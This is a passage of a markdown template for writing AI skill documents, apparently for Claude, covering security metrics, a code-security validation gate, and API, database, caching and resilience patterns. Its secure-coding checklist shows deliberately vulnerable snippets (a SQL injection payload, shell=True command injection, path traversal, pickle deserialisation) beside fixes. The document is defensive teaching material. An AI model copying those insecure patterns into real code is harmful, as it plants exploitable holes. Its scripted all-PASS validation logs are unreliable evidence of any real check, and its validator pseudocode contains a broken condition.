        - security.gate.pass_rate (by gate)
      threshold: 95% (SLO line)
```

### Metric Collection Implementation

```python
# Complete metrics collection service
class SecurityMetricsCollector:
    def __init__(self, metrics_backend='prometheus'):
        self.vuln_metrics = VulnerabilityMetrics()
        self.test_metrics = SecurityTestMetrics()
        self.dep_metrics = DependencyMetrics()
        self.debt_metrics = SecurityDebtMetrics()
        self.backend = metrics_backend

    def collect_all_metrics(self) -> Dict[str, any]:
        """Run all metric collection (execute daily via cron)"""
        return {
            'timestamp': datetime.now().isoformat(),
            'vulnerability_management': {
                'mttd_slo_compliance': self.vuln_metrics.get_mttd_slo_compliance(),
                'open_vulns_by_severity': self.vuln_metrics.count_open_vulnerabilities(),
                'vulnerability_window_avg': self.vuln_metrics.calculate_avg_window()
            },
            'security_testing': {
                'test_coverage': self.test_metrics.calculate_security_test_coverage(),
                'regression_test_count': self.test_metrics.count_security_regression_tests()
            },
            'dependency_security': {
                'dependency_age': self.dep_metrics.calculate_dependency_age(),
                'vulnerable_dependencies': self.dep_metrics.count_vulnerable_dependencies()
            },
            'security_debt': {
                'debt_score': self.debt_metrics.calculate_security_debt_score()
            }
        }

    def generate_weekly_report(self) -> str:
        """Generate security metrics summary report"""
        metrics = self.collect_all_metrics()

        report = f"""
        # Security Metrics Weekly Report

        ## Vulnerability Management
        - MTTD SLO Compliance: {metrics['vulnerability_management']['mttd_slo_compliance']}
        - Open CRITICAL: {metrics['vulnerability_management']['open_vulns_by_severity']['critical']}
        - Open HIGH: {metrics['vulnerability_management']['open_vulns_by_severity']['high']}

        ## Security Testing
        - Avg Test Coverage: {metrics['security_testing']['test_coverage']['average']}%
        - Regression Tests: {metrics['security_testing']['regression_test_count']}

        ## Security Debt
        - Total Score: {metrics['security_debt']['debt_score']['total_score']}
        - Risk Level: {metrics['security_debt']['debt_score']['risk_level']}

        ## Actions Required
        {self._generate_action_items(metrics)}
        """

        return report
```

### Metric Review Cadence

**Daily**:
- [ ] Check open CRITICAL/HIGH vulnerabilities (should be 0)
- [ ] Review security gate failures from previous day
- [ ] Check incident MTTD/MTTR metrics

**Weekly**:
- [ ] Review security test coverage trends
- [ ] Analyze security debt score changes
- [ ] Review dependency age report
- [ ] Generate weekly security metrics report

**Monthly**:
- [ ] Security metrics review meeting with leadership
- [ ] Assess progress on security KPI targets
- [ ] Identify trends and systemic issues
- [ ] Adjust security roadmap based on metrics

**Quarterly**:
- [ ] Deep-dive analysis of all security metrics
- [ ] Benchmark against industry standards
- [ ] Update security metric targets based on lessons learned
- [ ] Present security posture to executive leadership

### Success Criteria

**Minimum Security Metrics Targets** (for HIGH-risk production systems):

- [ ] **Vulnerability MTTD**: <24h for CRITICAL, <7d for HIGH
- [ ] **Vulnerability MTTR**: <48h for CRITICAL, <14d for HIGH
- [ ] **Open Vulnerabilities**: Zero CRITICAL, <5 HIGH at any time
- [ ] **Security Test Coverage**: ≥90% for auth/authz/validation/crypto
- [ ] **Regression Test Count**: 100% of security bugs have tests
- [ ] **Dependency Age**: Zero dependencies >2 years old
- [ ] **Security Debt Score**: <150 (MEDIUM risk or lower)
- [ ] **Security Gate Pass Rate**: ≥95%
- [ ] **Incident MTTD**: <5min for P0, <15min for P1
- [ ] **Incident MTTR**: <1h for P0, <4h for P1
```

---

## 1. Overview

**Template Instructions**: Provide a high-level introduction that establishes expertise and scope.

**Content to Include**:
- Role definition: "You are an elite/expert [domain] specialist..."
- Core expertise areas (3-5 key areas)
- What makes this skill unique or valuable
- Primary use cases and scenarios

**Example Structure**:
```markdown
You are an [expert/specialist] in [domain] with deep expertise in [area 1], [area 2], and [area 3]. Your mastery spans [technologies/methodologies] with a focus on [key principles like security, performance, reliability].

You excel at:
- [Primary capability 1]
- [Primary capability 2]
- [Primary capability 3]
```

---

## 2. Core Responsibilities / Principles

**Template Instructions**: Define the fundamental duties, principles, or pillars that guide this skill.

**Content to Include**:
- Primary responsibilities (numbered or bulleted)
- Core principles or methodologies
- Decision-making frameworks
- Priorities and trade-offs

**Subsections** (choose relevant ones):
- ### Principle 1: [Name]
  - What it means
  - Why it matters
  - How to apply it

- ### Responsibility Area 1: [Name]
  - When to apply
  - Key actions
  - Success criteria

**Example Structure**:
```markdown
### 1. [Responsibility Area Name]

When [performing this responsibility], you will:
- [Action 1] - [Why/how]
- [Action 2] - [Why/how]
- [Action 3] - [Why/how]
```

---

## 3. Technical Foundation / Framework Expertise

**Template Instructions**: Cover the technical ecosystem, tools, frameworks, and technologies.

**Content to Include**:
- Core technologies with version recommendations (LTS, latest, minimum, EOL)
- Essential frameworks and libraries
- Ecosystem overview
- Architecture patterns
- Configuration requirements
- Security advisory sources

**Subsections**:
- ### Core Technologies & Version Strategy
  - Primary language/platform with version matrix
  - Framework versions (LTS vs. cutting-edge)
  - Key dependencies with minimum versions
  - EOL versions to avoid
  - Security advisory sources

- ### Essential Tools & Libraries
  - Category-based organization
  - Version specifications
  - When to use each tool
  - Security considerations for each tool

- ### Architecture Patterns
  - Recommended patterns
  - Anti-patterns to avoid
  - Design principles
  - Security architecture patterns

**Example Structure**:
```markdown
### Core Technologies & Version Strategy

#### Primary Language/Platform: [Language Name]

**Version Recommendations** (as of [YYYY-MM-DD]):

| Use Case | Version | Support Until | Notes |
|----------|---------|---------------|-------|
| **Production (LTS)** | [X.Y] | [Date] | Recommended for stability, long-term support |
| **Cutting-Edge** | [X.Y] | [Date] | Latest features, shorter support window |
| **Minimum Supported** | [X.Y]+ | [Date] | Oldest version receiving security patches |
| **Avoid (EOL)** | [X.Y] | Ended [Date] | No longer receiving security updates ⚠️ |

**Rationale**:
- **Production deployments**: Use [X.Y LTS] for maximum stability and security support
- **New projects with modern features**: Consider [Latest X.Y] if features justify shorter support cycle
- **Legacy systems**: Upgrade from [EOL version] to at least [Minimum Supported]

**Security Advisory Sources**:
- **Official**: [Link to official security advisories]
- **CVE Database**: [Link to CVE search for this technology]
- **Community**: [Link to security mailing list/forum]

#### Framework: [Framework Name]

**Version Recommendations**:

| Use Case | Version | Compatible With | Notes |
|----------|---------|-----------------|-------|
| **Recommended** | [X.Y.Z]+ | [Language X.Y+] | Latest stable with security patches |
| **Minimum** | [X.Y.Z]+ | [Language X.Y+] | Minimum for security compliance |
| **Avoid** | < [X.Y.Z] | - | Contains known vulnerabilities (CVE-XXXX-XXXXX) |

**Breaking Changes & Migration**:
- [Version X.Y → X.Z]: [Major breaking changes and migration guide link]

### Essential Tools & Libraries

#### [Category Name] (e.g., Security, Testing, Logging)

**[Tool Name]** ([X.Y.Z]+)
- **Purpose**: [What it does]
- **When to use**: [Use cases]
- **Security considerations**: [Any security notes]
- **Installation**: `[package manager command]`
- **Configuration**: [Brief config example]

[Repeat for each tool]

### Security Dependencies

**MANDATORY for [High/Medium]-risk domains**:
- **Input Validation**: [Library name and version]
- **Secrets Management**: [Library/service name]
- **Cryptography**: [Library name - must be well-audited]
- **Authentication**: [Library/framework name]
- **Authorization**: [Library/framework name]
- **Security Headers**: [Middleware/library name]
- **CSRF Protection**: [Library/middleware name]
- **Rate Limiting**: [Library/service name]

**Dependency Security Scanning**:
```bash
# Required security scanning tools
[dependency-scanner] [options]  # e.g., npm audit, pip-audit, cargo audit

# Continuous monitoring
[tool-name] [options]  # e.g., Snyk, Dependabot, Renovate
```
```

---

## 4. Implementation Patterns / Best Practices

**🚨 VALIDATION GATE: Code Example Security Validation 🚨**

**BLOCKING for ALL risk levels**

---

### Code Security Validation Protocol

Every code example included in this skill MUST pass security validation before being documented.

**Claude MUST self-validate each code example using this checklist:**

#### Automated Security Checks (BLOCKING)

For EVERY code example, validate:

```python
def validate_code_example(code_snippet, context):
    """
    Security validation for code examples.
    BLOCKING failures must be fixed before inclusion.
    """

    # CRITICAL BLOCKING ISSUES (must fix immediately):
    blocking_issues = {
        "hardcoded_secrets": check_no_hardcoded_credentials(code),
        "sql_injection": check_no_string_formatted_queries(code),
        "command_injection": check_no_shell_true_with_input(code),
        "path_traversal": check_path_validation(code),
        "unsafe_deserialization": check_no_pickle_yaml_unsafe(code),
    }

    # HIGH-RISK domain requirements:
    if risk_level == "HIGH":
        high_risk_checks = {
            "input_validation": check_validation_present(code),
            "parameterized_queries": check_parameterized_db_queries(code),
            "error_handling": check_no_info_leakage(code),
            "logging_safety": check_no_pii_in_logs(code),
        }
        blocking_issues.update(high_risk_checks)

    # Code quality (recommended but not blocking):
    quality_checks = {
        "type_hints": has_type_annotations(code),  # for typed languages
        "security_comments": has_security_explanation(code),
        "good_bad_indicator": marked_with_checkmark_or_x(code),
    }

    # Fail if any blocking issue found:
    if any(blocking_issues.values() == False):
        return ValidationFailure(blocking_issues)

    return ValidationSuccess()
```

---

### Security Validation Checklist

**For EACH code example, Claude MUST verify:**

**CRITICAL (BLOCKING FOR ALL RISK LEVELS):**
- [ ] **No Hardcoded Secrets**: No API keys, passwords, tokens, connection strings
  - ❌ `API_KEY = "sk-1234567890abcdef"`
  - ✅ `API_KEY = os.getenv("API_KEY")`

- [ ] **No SQL/NoSQL Injection**: No string formatting for database queries
  - ❌ `query = f"SELECT * FROM users WHERE id = {user_id}"`
  - ✅ `query = "SELECT * FROM users WHERE id = ?", (user_id,)`

- [ ] **No Command Injection**: No `shell=True` with user input
  - ❌ `subprocess.run(f"ls {user_dir}", shell=True)`
  - ✅ `subprocess.run(["ls", user_dir])`

- [ ] **No Path Traversal**: Validate and resolve all file paths
  - ❌ `open(f"/uploads/{user_file}")`
  - ✅ `path = (base_dir / user_file).resolve(); validate_within_base(path)`

- [ ] **No Unsafe Deserialization**: No `pickle.load()` or `yaml.load()` with untrusted data
  - ❌ `data = pickle.load(user_file)`
  - ✅ `data = json.loads(user_file.read())`

**HIGH-RISK DOMAIN REQUIREMENTS:**
- [ ] **Input Validation Present**: All user inputs validated
- [ ] **Parameterized Queries**: Database queries use parameterization
- [ ] **Safe Error Messages**: No stack traces or internal details leaked
- [ ] **Logging Excludes PII/Secrets**: No passwords, emails, tokens in logs
- [ ] **Type Safety**: Type hints present (for typed languages)

**CODE QUALITY (RECOMMENDED):**
- [ ] **Security Comments**: Explain security decisions
- [ ] **Marked with Indicator**: Use ✅ for good examples, ❌ for bad
- [ ] **Complete Context**: Example is copy-pasteable and functional

---

### Validation Failure Response

**IF code example fails security validation, Claude MUST output:**

```
❌ CODE EXAMPLE SECURITY VALIDATION FAILED ❌

Location: Section 4.X, Pattern "[Pattern Name]"
Code snippet:
```[language]
[problematic code]
```

Security Issues Found:
❌ Hardcoded secret: Line 3 contains API key "sk-1234..."
❌ SQL injection: Line 7 uses string formatting for query
⚠️  No input validation: User input not validated before use

⛔ Cannot include vulnerable code in production skill ⛔

Code examples MUST be secure by default. Users copy-paste these examples.

Action required:
1. Fix all ❌ BLOCKING issues
2. Add security comments explaining the fix
3. Provide both ❌ bad and ✅ good versions for comparison
4. Re-validate before including

Example will NOT be included until security issues resolved.
```

---

### Code Example Quality Standards

**MANDATORY format for security-sensitive examples:**

```markdown
### Pattern X: [Pattern Name]

#### ❌ INSECURE (DO NOT USE)

```[language]
# ❌ VULNERABLE: SQL injection via string formatting
def get_user_bad(username):
    query = f"SELECT * FROM users WHERE username = '{username}'"
    return db.execute(query).fetchone()
    # Attacker input: "admin' OR '1'='1' --" bypasses auth
```

**Why this is dangerous:**
- String formatting allows SQL injection
- Attacker can manipulate query logic
- Could lead to authentication bypass, data theft

#### ✅ SECURE (RECOMMENDED)

```[language]
# ✅ SECURE: Parameterized query prevents injection
def get_user(username: str) -> User | None:
    """Fetch user with SQL injection prevention."""
    # Use parameterized query - database driver handles escaping
    query = "SELECT * FROM users WHERE username = ?"
    return db.execute(query, (username,)).fetchone()
```

**Security measures:**
- Parameterized query prevents injection
- Type hints for clarity
- Database handles input escaping
- Safe for any user input
```

**For HIGH-RISK domains:**
- Every security-sensitive example MUST show both ❌ bad and ✅ good versions
- Each ✅ good example MUST include security comments
- Must explain WHY the bad version is dangerous
- Must explain WHAT the good version does to prevent it

---

### Validation Gate Execution

**Claude's mandatory validation process:**

1. **Before adding any code example:**
   ```
   Running security validation on code example...
   Checking: hardcoded secrets... ✅ PASS
   Checking: SQL injection... ✅ PASS
   Checking: command injection... ✅ PASS
   Checking: path traversal... ✅ PASS
   Checking: unsafe deserialization... ✅ PASS
   ✅ Code example passed all security checks
   ```

2. **If validation fails:**
   ```
   Running security validation on code example...
   Checking: hardcoded secrets... ❌ FAIL (found API key on line 5)
   Checking: SQL injection... ✅ PASS
   ⛔ Code example FAILED security validation
   Fixing issues before inclusion...
   ```

3. **After all examples validated:**
   ```
   📋 GATE 4.X CODE SECURITY VALIDATION: COMPLETE

   Total code examples: 47
   Security issues found: 0
   All examples include:
     ✅ No hardcoded secrets
     ✅ No injection vulnerabilities
     ✅ Input validation (where applicable)
     ✅ Safe error handling

   ✅ All code examples validated - ready for production use
   ```

---

**Template Instructions**: Provide concrete implementation guidance with code examples.

**Content to Include**:
- Code examples (language-appropriate)
- Configuration samples
- Common patterns
- Step-by-step implementations
- Template code that can be adapted

**Format Options**:
- Code blocks with inline comments
- Before/after comparisons
- Annotated examples with ✅ (correct) and ❌ (incorrect)
- Multi-file examples when needed

**Example Structure**:
```markdown
### Pattern 1: [Pattern Name]

**When to use**: [Scenario description]

**Implementation**:
```[language]
# ✅ Best practice implementation
[code example with comments]
```

**Key points**:
- [Important aspect 1]
- [Important aspect 2]
```

---

### 4.1 API Design Patterns (Conditional)

**Template Instructions**:
- **INCLUDE IF**: Domain involves REST APIs, GraphQL, gRPC, or any client-server communication
- **SKIP IF**: Pure library/utility skill with no API layer
- **APPLIES TO**: Backend services, full-stack applications, microservices

**Example Structure**:
```markdown
### 4.1 API Design Patterns

[**CLAUDE**: Choose the relevant API protocol for this domain]

---

#### 4.1.1 REST API Design (if applicable)

**Resource Naming Conventions**:
```http
# ✅ GOOD: RESTful resource design
GET    /api/v1/[resources]              # List [resources] (paginated)
GET    /api/v1/[resources]/{id}         # Get specific [resource]
POST   /api/v1/[resources]              # Create [resource]
PUT    /api/v1/[resources]/{id}         # Update [resource] (full)
PATCH  /api/v1/[resources]/{id}         # Partial update
DELETE /api/v1/[resources]/{id}         # Delete [resource]
GET    /api/v1/[resources]/{id}/[nested] # Nested resources

# ❌ BAD: Non-RESTful, verb-based
POST /api/get[Resource]
POST /api/create[Resource]
```

**HTTP Status Codes**:
```[language]
# Success
200 OK          # GET, PUT, PATCH successful
201 Created     # POST successful (return Location header)
204 No Content  # DELETE successful

# Client Errors
400 Bad Request        # Validation failed
401 Unauthorized       # Missing/invalid authentication
403 Forbidden          # Authenticated but not authorized
404 Not Found          # Resource doesn't exist
409 Conflict           # Duplicate resource
422 Unprocessable      # Business logic validation failed
429 Too Many Requests  # Rate limit exceeded

# Server Errors
500 Internal Error     # Unexpected server error
502 Bad Gateway        # Upstream service error
503 Service Unavailable # Temporary downtime
```

**Pagination Pattern**:
```[language]
# ✅ Cursor-based pagination (scales to millions)
GET /api/v1/[resources]?cursor=[timestamp]&limit=20

Response:
{
  "data": [...],
  "pagination": {
    "next_cursor": "[next_timestamp]",
    "has_more": true
  }
}

# ⚠️ Offset pagination (acceptable for <10K records)
GET /api/v1/[resources]?page=1&limit=20
```

**API Versioning**:
```[language]
# ✅ Recommended: URL versioning
/api/v1/[resources]  # Version 1
/api/v2/[resources]  # Version 2 (breaking changes)

# Maintain old versions for at least 6 months after deprecation notice
```

---

#### 4.1.2 GraphQL API Design (if applicable)

**Schema Design**:
```graphql
# ✅ Well-structured schema
type [Resource] {
  id: ID!
  [field1]: String!
  [field2]: Int
  [nested]: [[NestedType]!]!
  createdAt: DateTime!
}

type Query {
  [resource](id: ID!): [Resource]
  [resources](limit: Int = 20, cursor: String): [ResourceConnection]!
}

type Mutation {
  create[Resource](input: Create[Resource]Input!): [Resource]!
  update[Resource](id: ID!, input: Update[Resource]Input!): [Resource]!
  delete[Resource](id: ID!): Boolean!
}

type [ResourceConnection] {
  edges: [[ResourceEdge]!]!
  pageInfo: PageInfo!
}
```

**Resolver Pattern**:
```[language]
# ✅ DataLoader for N+1 prevention
const [resource]Loader = new DataLoader(async (ids) => {
  const [resources] = await db.[resources].findMany({
    where: { id: { in: ids } }
  });
  return ids.map(id => [resources].find(r => r.id === id));
});

// Resolver
async [resource](parent, { id }, context) {
  return context.[resource]Loader.load(id);
}
```

---

#### 4.1.3 gRPC API Design (if applicable)

**Protobuf Schema**:
```protobuf
// ✅ Well-designed service
syntax = "proto3";

package [domain].v1;

service [Service] {
  rpc Get[Resource](Get[Resource]Request) returns ([Resource]);
  rpc List[Resources](List[Resources]Request) returns (List[Resources]Response);
  rpc Create[Resource](Create[Resource]Request) returns ([Resource]);
  rpc Update[Resource](Update[Resource]Request) returns ([Resource]);
  rpc Delete[Resource](Delete[Resource]Request) returns (google.protobuf.Empty);

  // Streaming RPCs for real-time
  rpc Stream[Resources](Stream[Resources]Request) returns (stream [Resource]);
}

message [Resource] {
  string id = 1;
  string [field1] = 2;
  int32 [field2] = 3;
  google.protobuf.Timestamp created_at = 4;
}

message Get[Resource]Request {
  string id = 1;
}

message List[Resources]Request {
  int32 page_size = 1;
  string page_token = 2;
}

message List[Resources]Response {
  repeated [Resource] [resources] = 1;
  string next_page_token = 2;
}
```

**gRPC Error Handling**:
```[language]
# ✅ Use standard gRPC status codes
import grpc

# Not found
return grpc.StatusCode.NOT_FOUND, "Resource not found"

# Invalid input
return grpc.StatusCode.INVALID_ARGUMENT, "Field validation failed"

# Unauthorized
return grpc.StatusCode.UNAUTHENTICATED, "Missing credentials"

# Forbidden
return grpc.StatusCode.PERMISSION_DENIED, "Insufficient permissions"
```

---

#### 4.1.4 API Contract Testing

**OpenAPI Specification (REST)**:
```yaml
openapi: 3.0.0
info:
  title: [API Name]
  version: 1.0.0

paths:
  /api/v1/[resources]:
    post:
      summary: Create [resource]
      requestBody:
        required: true
        content:
          application/json:
            schema:
              $ref: '#/components/schemas/Create[Resource]Request'
      responses:
        '201':
          description: Created
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/[Resource]'
        '400':
          $ref: '#/components/responses/ValidationError'
        '401':
          $ref: '#/components/responses/Unauthorized'

components:
  schemas:
    Create[Resource]Request:
      type: object
      required:
        - [field1]
      properties:
        [field1]:
          type: string
          minLength: 1
          maxLength: 255
```

**Contract Testing**:
```[language]
# Test: API conforms to OpenAPI spec
def test_create_[resource]_conforms_to_contract():
    response = client.post('/api/v1/[resources]', json={
        '[field1]': 'value'
    })

    # Validate response against schema
    validate_response(response, schema='Create[Resource]Response')
    assert response.status_code == 201
```

---

#### 4.1.5 Backward Compatibility Rules

**NEVER break these contracts** (without new version):
- ❌ Remove required fields
- ❌ Change field types (string → int)
- ❌ Remove endpoints
- ❌ Change response structure
- ❌ Rename fields

**SAFE changes**:
- ✅ Add optional fields
- ✅ Add new endpoints
- ✅ Add new API versions
- ✅ Deprecate old fields (with notice period)
```

---

### 4.2 Database Design & Migration Patterns (Conditional)

**Template Instructions**:
- **INCLUDE IF**: Domain uses relational or NoSQL databases
- **SKIP IF**: Stateless/in-memory only skill
- **APPLIES TO**: Backend services, full-stack applications, data pipelines

**Example Structure**:
```markdown
### 4.2 Database Design & Migration Patterns

---

#### 4.2.1 Schema Design Principles

**[CLAUDE**: Choose SQL or NoSQL based on domain]

**SQL Schema Design**:
```sql
-- ✅ Normalized design (OLTP workloads)
CREATE TABLE [table_name] (
    id BIGSERIAL PRIMARY KEY,
    [field1] VARCHAR(255) NOT NULL,
    [field2] INTEGER,
    [foreign_key]_id BIGINT REFERENCES [other_table](id),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,

    CONSTRAINT [unique_constraint] UNIQUE ([field1], [field2])
);

-- Indexes for query performance
CREATE INDEX idx_[table]_[field] ON [table]([field]);
CREATE INDEX idx_[table]_composite ON [table]([field1], [field2]);

-- ❌ BAD: Missing indexes on foreign keys
-- ❌ BAD: No created_at/updated_at timestamps
-- ❌ BAD: No constraints
```

**NoSQL Schema Design** (if applicable):
```[language]
# ✅ Document design for MongoDB/DynamoDB
{
  "_id": "uuid",
  "[entity_type]": {
    "[field1]": "value",
    "[field2]": 123,
    "[nested_array]": [
      { "[nested_field]": "value" }
    ]
  },
  "metadata": {
    "created_at": "ISO8601",
    "updated_at": "ISO8601",
    "version": 1
  }
}

# Indexes
db.[collection].createIndex({ "[field1]": 1 })
db.[collection].createIndex({ "[field2]": 1, "metadata.created_at": -1 })
```

---

#### 4.2.2 Migration Strategy (MANDATORY)

**Forward-Only Migrations**:
```[language]
# ✅ Migration file naming: YYYYMMDDHHMMSS_description.[ext]
# Example: 20250117120000_create_users_table.sql

-- migrations/20250117120000_create_[table].sql
-- UP migration
CREATE TABLE [table_name] (
    id BIGSERIAL PRIMARY KEY,
    [field] VARCHAR(255) NOT NULL
);

-- DOWN migration (separate file or same file)
DROP TABLE IF EXISTS [table_name];
```

**Zero-Downtime Migrations** (for production):
```sql
-- Phase 1: Add column as NULLABLE
ALTER TABLE [table] ADD COLUMN [new_field] VARCHAR(255);

-- Phase 2: Backfill data (background job, not in migration)
-- UPDATE [table] SET [new_field] = [old_field] WHERE [new_field] IS NULL;

-- Phase 3: Make NOT NULL (after backfill completes)
ALTER TABLE [table] ALTER COLUMN [new_field] SET NOT NULL;

-- Phase 4: Drop old column (after code deployed)
ALTER TABLE [table] DROP COLUMN [old_field];
```

**Migration Checklist**:
- [ ] Migrations are forward-only (never edit existing migrations)
- [ ] Each migration is reversible (has down migration)
- [ ] Large data migrations run as background jobs, not in migration
- [ ] Schema changes compatible with running code (zero-downtime)
- [ ] Migrations tested on production-like data volume

---

#### 4.2.3 Query Optimization Patterns

**Connection Pooling**:
```[language]
# ✅ Always use connection pools
pool = ConnectionPool(
    min_connections=5,           # Min idle
    max_connections=20,          # Max total
    idle_timeout=30000,          # Close idle after 30s
    connection_timeout=2000,     # Fail fast
)

# ❌ BAD: New connection per request
def handle_request():
    conn = create_connection()  # DON'T DO THIS
    # ...
```

**N+1 Query Prevention**:
```[language]
# ❌ BAD: N+1 queries
[items] = query_[items]()  # 1 query
for item in [items]:
    [related] = query_[related](item.id)  # N queries!

# ✅ GOOD: Eager loading with JOIN
[items] = query_[items]_with_[related]()  # 1 query

# SQL
SELECT [items].*, [related].*
FROM [items]
LEFT JOIN [related] ON [items].id = [related].[item]_id;

# ORM (example)
[items] = db.query([Item]).options(joinedload([Item].[related])).all()
```

**Query Performance Targets**:
- Simple SELECT: <10ms
- JOIN queries: <50ms
- Aggregations: <100ms
- Full-text search: <200ms

**ALWAYS use EXPLAIN**:
```sql
EXPLAIN ANALYZE
SELECT * FROM [table] WHERE [field] = 'value';

-- Look for:
-- ✅ Index Scan (good)
-- ❌ Seq Scan (bad - add index)
-- ❌ Nested Loop with high cost (bad - rewrite JOIN)
```

---

#### 4.2.4 Transaction Patterns

**Transaction Scope = Business Operation**:
```[language]
# ✅ GOOD: Transaction wraps entire business operation
@transactional
def transfer_[operation](from_[entity], to_[entity], amount):
    debit(from_[entity], amount)
    credit(to_[entity], amount)
    log_[operation](from_[entity], to_[entity], amount)
    # All succeed or all rollback

# ❌ BAD: Multiple transactions = inconsistent state
def transfer_[operation]_bad(from_[entity], to_[entity], amount):
    with transaction():
        debit(from_[entity], amount)
    # CRASH HERE = money gone!
    with transaction():
        credit(to_[entity], amount)
```

**Isolation Levels**:
```[language]
# Default: READ COMMITTED (prevents dirty reads)

# Use SERIALIZABLE for critical operations
with transaction(isolation_level='SERIALIZABLE'):
    # Prevents concurrent modifications
    [entity] = query_for_update([id])
    [entity].[field] = new_value
    save([entity])
```
```

---

### 4.3 Caching & Performance Patterns (Conditional)

**Template Instructions**:
- **INCLUDE IF**: Domain requires high performance or scalability
- **MANDATORY FOR**: Web APIs, microservices, high-traffic applications
- **SKIP IF**: CLI tools, batch jobs, low-traffic internal tools

**Example Structure**:
```markdown
### 4.3 Caching & Performance Patterns

---

#### 4.3.1 Multi-Layer Caching Strategy

**Caching Layers** (ordered by latency):
```
1. Browser/Client Cache (HTTP headers)  →  0ms
   ↓ (miss)
2. CDN Cache (static assets)            →  10-50ms
   ↓ (miss)
3. Application Cache (Redis/Memcached)  →  1-5ms
   ↓ (miss)
4. Database Query Cache                 →  10-100ms
   ↓ (miss)
5. Database Disk                        →  100-500ms
```

---

#### 4.3.2 HTTP Caching Headers

```http
# ✅ Immutable assets (versioned/content-hashed)
Cache-Control: public, max-age=31536000, immutable
# For: /assets/app.[hash].js

# ✅ API responses (private, must revalidate)
Cache-Control: private, must-revalidate, max-age=0
ETag: "[content_hash]"
# For: GET /api/[resources]/me

# ✅ Public data (cacheable for short time)
Cache-Control: public, max-age=300
# For: GET /api/public/[resources]

# ❌ BAD: No cache headers
(missing Cache-Control)
```

---

#### 4.3.3 Application-Level Caching

```[language]
# ✅ Cache with TTL and invalidation
@cache(key='[entity]:{id}', ttl=300)  # 5 min TTL
def get_[entity](id):
    return db.query([Entity]).get(id)

def update_[entity](id, data):
    [entity] = db.query([Entity]).get(id)
    [entity].update(data)
    db.commit()

    # CRITICAL: Invalidate cache
    cache.delete(f'[entity]:{id}')

# ✅ Cache aside pattern
def get_[entity]_cached(id):
    # Try cache first
    cached = cache.get(f'[entity]:{id}')
    if cached:
        return cached

    # Cache miss: query database
    [entity] = db.query([Entity]).get(id)

    # Store in cache
    cache.set(f'[entity]:{id}', [entity], ttl=300)
    return [entity]
```

---

#### 4.3.4 Performance Optimization Patterns

**Query Optimization**:
```[language]
# ✅ Select only needed fields
SELECT id, name, email FROM [table]  # Not SELECT *

# ✅ Use pagination for large result sets
SELECT * FROM [table] LIMIT 20 OFFSET 0

# ✅ Cursor-based for better performance
SELECT * FROM [table]
WHERE created_at < $cursor
ORDER BY created_at DESC
LIMIT 20
```

**Rate Limiting**:
```[language]
# ✅ Protect against abuse
@rate_limit(max=100, window=60)  # 100 requests per minute
def api_endpoint():
    # ...

# Implementation
def check_rate_limit(user_id, max_requests, window_seconds):
    key = f'rate_limit:{user_id}'
    current = cache.incr(key)

    if current == 1:
        cache.expire(key, window_seconds)

    if current > max_requests:
        raise RateLimitExceeded()
```

**Performance Targets**:
- API response time: p50 <100ms, p99 <500ms
- Database queries: p50 <10ms, p99 <100ms
- Cache hit rate: >80%
- Error rate: <0.1%
```

---

### 4.4 Resilience & Fault Tolerance Patterns (Conditional)

**Template Instructions**:
- **INCLUDE IF**: Domain involves external service calls, distributed systems, or microservices
- **MANDATORY FOR**: Microservices, API integrations, cloud-native applications
- **SKIP IF**: Standalone applications with no external dependencies

**Example Structure**:
```markdown
### 4.4 Resilience & Fault Tolerance Patterns

---

#### 4.4.1 Timeout Pattern (MANDATORY)

**All external calls MUST have timeouts**:
```[language]
# ✅ GOOD: Explicit timeout
response = http_client.get('[url]', timeout=5.0)  # 5 second timeout

# ❌ BAD: No timeout (blocks forever if service hangs)
response = http_client.get('[url]')
```

**Recommended Timeouts**:
- Database queries: 1-5 seconds
- External HTTP APIs: 5-10 seconds
- Internal microservices: 2-5 seconds
- Third-party services: 10-30 seconds

---

#### 4.4.2 Retry with Exponential Backoff

```[language]
# ✅ Retry transient failures
from tenacity import retry, stop_after_attempt, wait_exponential

@retry(
    stop=stop_after_attempt(3),
    wait=wait_exponential(multiplier=1, min=1, max=10),
    retry=retry_if_exception_type(TransientError)
)
def call_[external_service]([params]):
    response = http_client.post('[url]', json=[params], timeout=5)
    response.raise_for_status()
    return response.json()

# Retry schedule:
# Attempt 1: Immediate
# Attempt 2: Wait 1s
# Attempt 3: Wait 2s
# Then give up
```

**Retry Only Idempotent Operations**:
- ✅ GET requests (safe to retry)
- ✅ PUT requests (idempotent)
- ✅ DELETE requests (idempotent)
- ⚠️ POST requests (NOT idempotent - use idempotency keys)

---

#### 4.4.3 Circuit Breaker Pattern

```[language]
# ✅ Prevent cascading failures
class CircuitBreaker:
    def __init__(self, max_failures=5, reset_timeout=60):
        self.max_failures = max_failures
        self.reset_timeout = reset_timeout
        self.failure_count = 0
        self.last_failure_time = None
        self.state = 'CLOSED'  # CLOSED, OPEN, HALF_OPEN

    def call(self, func, *args, **kwargs):
        if self.state == 'OPEN':
            if time.time() - self.last_failure_time > self.reset_timeout:
                self.state = 'HALF_OPEN'
            else:
                raise CircuitBreakerOpen('[Service] unavailable')

        try:
            result = func(*args, **kwargs)
            # Success: reset
            self.failure_count = 0
            self.state = 'CLOSED'
            return result
        except Exception as e:
            self.failure_count += 1
            self.last_failure_time = time.time()

            if self.failure_count >= self.max_failures:
                self.state = 'OPEN'
            raise

# Usage
[service]_breaker = CircuitBreaker(max_failures=5, reset_timeout=60)

def call_[service]():
    return [service]_breaker.call([service].get_data)
```

---

#### 4.4.4 Graceful Degradation

```[language]
# ✅ Fallback when service unavailable
async def get_[data]([params]):
    try:
        # Try primary service with timeout
        return await [primary_service].get([params], timeout=2.0)
    except (TimeoutError, ServiceUnavailable):
        logger.warn('[Primary service] unavailable, using fallback')
        # Return cached/default data
        return get_[fallback_data]([params])

# Example: Recommendation engine fallback
async def get_recommendations(user_id):
    try:
        return await ml_service.get_recommendations(user_id, timeout=2.0)
    except Exception:
        # Fallback: return popular items
        return await get_popular_items()
```

---

#### 4.4.5 Bulkhead Pattern (Resource Isolation)

```[language]
# ✅ Separate thread pools for different services
[service_a]_pool = ThreadPoolExecutor(max_workers=10)
[service_b]_pool = ThreadPoolExecutor(max_workers=10)

# If service_b fails/slows, service_a still has resources
def call_[service_a]():
    return [service_a]_pool.submit([service_a].request).result()

def call_[service_b]():
    return [service_b]_pool.submit([service_b].request).result()
```
```

---

### 4.5 Zero Trust Architecture & Service-to-Service Security (MANDATORY for HIGH-risk)

